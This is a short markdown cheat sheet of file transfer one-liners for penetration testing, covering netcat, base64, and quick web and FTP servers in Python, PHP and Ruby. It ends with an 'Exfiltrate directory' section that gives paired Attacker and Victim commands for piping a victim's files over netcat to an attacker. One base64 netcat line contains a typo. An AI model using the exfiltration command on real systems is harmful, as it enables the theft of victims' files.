# File transfer methods

## Simple netcat
```
nc -lnvp 1337 > <file>
cat <file> | nc <ip> 1337
```

## Netcat with base64
```
base64 -w 0 <file> | nc <ip> 1337
nc - lvvp 1337 | base64 -d file
```

## Python2 HTTP server
```
python -m SimpleHTTPServer <port>
```

## Python3 HTTP server
```
python3 -m http.server <port>
```

## Python FTP server
```
python -m pyftpdlib -p<port> -w
```

## PHP web server
```
php -S <ip>:<port>
```

## Ruby web server
```
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
```

## Exfiltrate directory
Attacker: `nc -l <port> | tar xf -`
Victim: `tar cf - . | nc <ip> <port>`
```
